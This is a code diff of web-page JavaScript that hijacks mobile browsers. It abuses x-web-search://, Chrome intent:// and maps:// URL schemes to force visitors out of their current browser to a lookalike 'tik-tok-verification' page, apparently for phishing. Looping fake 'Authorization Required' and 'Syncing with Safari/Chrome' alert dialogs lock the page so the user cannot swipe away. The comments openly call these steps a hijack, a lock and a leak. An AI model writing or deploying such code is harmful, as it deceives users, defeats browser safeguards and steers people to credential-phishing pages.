@@ -11,41 +11,41 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function triggerSystemExit() {
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    function forceSystemRedirect() {
+        const isAndroid = /Android/i.test(navigator.userAgent);
         const urlNoProtocol = target.replace("https://", "");
 
-        // 1. THE EXIT TRIGGER: FaceTime or TelPrompt
-        // This is what forced the 'Gmail' prompt earlier, but even stronger.
-        if (isIOS) {
-            window.location.href = "facetime-prompt://" + "0000000000";
-        } else {
-            window.location.href = "tel:0000000000";
-        }
-
-        // 2. THE HIJACK: While the OS is showing the "Call?" prompt, 
-        // we inject the browser redirect into the navigation stack.
-        setTimeout(() => {
-            window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            // Android Chrome Intent fallback
+        // THE PRIMARY LEAK (Search and Store)
+        window.location.replace("x-web-search://?" + encodeURIComponent(target));
+        
+        if (isAndroid) {
             window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
-        }, 100);
+        } else {
+            // iOS Apple Maps search often forces Safari to open the result
+            window.location.href = "maps://?q=" + encodeURIComponent(target);
+        }
     }
 
     function rampage() {
         if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        // Fire the exit trigger
-        triggerSystemExit();
+        // 1. First alert to 'prime' the user gesture
+        alert("ATTEMPT #24\n\nStep 1: Authorization Required.\n\nTap OK.");
 
-        // THE LOCK: Keeps them from swiping away while the system prompt loads
-        alert("ATTEMPT #23\n\nSecurity Handover Initialized.\n\nTap OK to open the secure system browser.");
+        // 2. A 100ms 'Silence' window where the redirect fires
+        forceSystemRedirect();
 
-        // Post-Alert Jump
-        triggerSystemExit();
+        setTimeout(() => {
+            if (Date.now() > killTime) return;
 
-        // Slightly longer delay (50ms) to allow the OS to process the system dialogs
-        setTimeout(rampage, 50);
+            // 3. Second alert to 'lock' the thread while the OS processes the redirect
+            alert("ATTEMPT #24\n\nStep 2: Syncing with Safari/Chrome...\n\nTap OK.");
+            
+            forceSystemRedirect();
+            
+            // Loop back
+            setTimeout(rampage, 10);
+        }, 100); 
     }
 
     window.onload = () => {
